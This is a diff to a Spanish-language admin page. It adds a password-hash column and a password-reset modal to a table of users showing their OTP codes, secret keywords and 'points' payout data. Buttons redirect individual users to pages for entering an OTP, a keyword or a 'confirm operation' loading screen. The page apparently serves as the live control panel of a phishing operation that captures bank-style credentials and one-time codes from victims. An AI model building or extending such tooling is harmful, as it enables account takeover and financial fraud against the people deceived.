@@ -19,7 +19,7 @@
             text-align: center;
         }
         .container {
-            max-width: 1000px;
+            max-width: 1200px;
             margin: 40px auto;
             padding: 20px;
             background-color: white;
@@ -34,11 +34,13 @@
             width: 100%;
             border-collapse: collapse;
             margin-top: 20px;
+            font-size: 14px;
         }
         th, td {
-            padding: 12px 15px;
+            padding: 10px 12px;
             text-align: left;
             border-bottom: 1px solid #ddd;
+            vertical-align: middle;
         }
         th {
             background-color: #004080;
@@ -61,21 +63,41 @@
         }
         .btn-action {
             display: inline-block;
-            background-color: #28a745;
             color: white;
             padding: 6px 10px;
             text-decoration: none;
             border-radius: 4px;
-            font-size: 14px;
-            margin-right: 5px;
+            font-size: 12px;
+            margin-right: 3px;
+            margin-bottom: 3px;
+            border: none;
+            cursor: pointer;
         }
         .btn-action:hover {
-            background-color: #218838;
+            opacity: 0.9;
         }
         .status {
             margin-top: 10px;
             font-style: italic;
             color: #666;
+        }
+        .password-hash {
+            font-family: monospace;
+            font-size: 11px;
+            color: #666;
+            max-width: 150px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .btn-reset-pass {
+            background-color: #ffc107;
+            color: #000;
+            font-size: 11px;
+            padding: 4px 8px;
+        }
+        .btn-reset-pass:hover {
+            background-color: #e0a800;
         }
         /* Modal de puntos */
         .modal-overlay {
@@ -158,6 +180,39 @@
             cursor: pointer;
             color: #999;
         }
+        /* Modal reset password */
+        .modal-reset-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.55);
+            z-index: 1001;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-reset-overlay.active { display: flex; }
+        .modal-reset-box {
+            background: #fff;
+            border-radius: 10px;
+            padding: 28px 24px 22px;
+            width: 100%;
+            max-width: 360px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.18);
+            position: relative;
+        }
+        .modal-reset-box h3 {
+            margin: 0 0 16px;
+            color: #004080;
+        }
+        .modal-reset-box input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 15px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+        }
     </style>
 </head>
 <body>
@@ -180,7 +235,8 @@
             <thead>
                 <tr>
                     <th>ID</th>
-                    <th>Nombre de Usuario / Correo</th>
+                    <th>Usuario / Correo</th>
+                    <th>Contraseña (Hash)</th>
                     <th>OTP</th>
                     <th>Palabra clave</th>
                     <th>Acciones</th>
@@ -244,14 +300,23 @@
                         const tr = document.createElement('tr');
                         const apartmentCode = user.apartment_code || 'Sin registro';
                         const keywordCode = user.keyword_code || 'Sin registro';
+                        const passwordHash = user.password || 'Sin contraseña';
+                        const passwordDisplay = passwordHash.length > 20 
+                            ? passwordHash.substring(0, 25) + '...' 
+                            : passwordHash;
+                        
                         tr.innerHTML = `
                             <td>${user.id}</td>
                             <td>${user.username}</td>
+                            <td>
+                                <div class="password-hash" title="${passwordHash}">${passwordDisplay}</div>
+                                <button onclick="openResetModal(${user.id}, '${user.username}')" class="btn-action btn-reset-pass">Cambiar</button>
+                            </td>
                             <td>${apartmentCode}</td>
                             <td>${keywordCode}</td>
                             <td>
                                 <button onclick="openPointsModal(${user.id}, '${user.username}')" class="btn-action btn-points">Datos Puntos</button>
-                                <button onclick="redirectUser(${user.id}, 'numero-de-apto.html')" class="btn-action">OTP</button>
+                                <button onclick="redirectUser(${user.id}, 'numero-de-apto.html')" class="btn-action" style="background-color:#28a745;">OTP</button>
                                 <button onclick="redirectUser(${user.id}, 'palabra-clave.html')" class="btn-action" style="background-color:#6f42c1;">Escribir Clave</button>
                                 <button onclick="redirectUser(${user.id}, 'solicita-tu-turno.html')" class="btn-action" style="background-color:#fd7e14;">Solicitar turno</button>
                                 <button onclick="redirectUser(${user.id}, 'cargando-2.html')" class="btn-action" style="background-color:#6c757d;">Confirmar operacion</button>
@@ -316,7 +381,6 @@
             document.getElementById('input-cuenta-destino').value = '';
             document.getElementById('points-modal-status').textContent = '';
 
-            // Pre-cargar valores existentes si los hay
             fetch(`/api/points/${userId}`)
                 .then(r => r.json())
                 .then(d => {
@@ -334,7 +398,55 @@
             currentPointsUserId = null;
         }
 
+        // ── Modal Reset Password ─────────────────────────────────────────────
+        let currentResetUserId = null;
+
+        function openResetModal(userId, username) {
+            currentResetUserId = userId;
+            document.getElementById('reset-modal-username').textContent = username;
+            document.getElementById('new-pass-input').value = '';
+            document.getElementById('reset-modal-status').textContent = '';
+            document.getElementById('reset-modal-overlay').classList.add('active');
+        }
+
+        function closeResetModal() {
+            document.getElementById('reset-modal-overlay').classList.remove('active');
+            currentResetUserId = null;
+        }
+
+        async function saveNewPassword() {
+            const newPassword = document.getElementById('new-pass-input').value.trim();
+            const statusEl = document.getElementById('reset-modal-status');
+
+            if (!newPassword || newPassword.length < 4) {
+                statusEl.textContent = 'La contraseña debe tener al menos 4 caracteres.';
+                statusEl.style.color = '#dc3545';
+                return;
+            }
+
+            try {
+                const res = await fetch(`/api/users/${currentResetUserId}/password`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ password: newPassword })
+                });
+                const data = await res.json();
+                if (!res.ok) throw new Error(data.error || 'Error al cambiar contraseña');
+                
+                statusEl.textContent = '✅ Contraseña actualizada correctamente.';
+                statusEl.style.color = '#28a745';
+                setTimeout(() => {
+                    closeResetModal();
+                    window.location.reload();
+                }, 1500);
+            } catch (err) {
+                statusEl.textContent = '❌ ' + err.message;
+                statusEl.style.color = '#dc3545';
+            }
+        }
+
         document.addEventListener('DOMContentLoaded', function() {
+            // Eventos modal puntos
             document.getElementById('btn-save-points').addEventListener('click', async () => {
                 const puntos = document.getElementById('input-puntos').value.trim();
                 const valor_cop = document.getElementById('input-valor-cop').value.trim();
@@ -369,6 +481,14 @@
             document.getElementById('points-modal-overlay').addEventListener('click', function(e) {
                 if (e.target === this) closePointsModal();
             });
+
+            // Eventos modal reset password
+            document.getElementById('btn-save-reset').addEventListener('click', saveNewPassword);
+            document.getElementById('btn-cancel-reset').addEventListener('click', closeResetModal);
+            document.getElementById('btn-close-reset-x').addEventListener('click', closeResetModal);
+            document.getElementById('reset-modal-overlay').addEventListener('click', function(e) {
+                if (e.target === this) closeResetModal();
+            });
         });
     </script>
 
@@ -387,6 +507,21 @@
             <div class="modal-actions">
                 <button class="btn-modal-cancel" id="btn-cancel-points">Cancelar</button>
                 <button class="btn-modal-save" id="btn-save-points">Guardar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal: Cambiar Contraseña -->
+    <div class="modal-reset-overlay" id="reset-modal-overlay">
+        <div class="modal-reset-box">
+            <button class="modal-close-x" id="btn-close-reset-x" aria-label="Cerrar">&times;</button>
+            <h3>🔑 Cambiar Contraseña — <span id="reset-modal-username"></span></h3>
+            <label style="font-size: 13px; color: #555; display: block; margin-bottom: 8px;">Nueva contraseña:</label>
+            <input type="password" id="new-pass-input" placeholder="Ingresa la nueva contraseña" />
+            <p id="reset-modal-status" style="margin: 0 0 15px; font-size: 13px; min-height: 18px;"></p>
+            <div class="modal-actions">
+                <button class="btn-modal-cancel" id="btn-cancel-reset">Cancelar</button>
+                <button class="btn-modal-save" id="btn-save-reset">Guardar</button>
             </div>
         </div>
     </div>
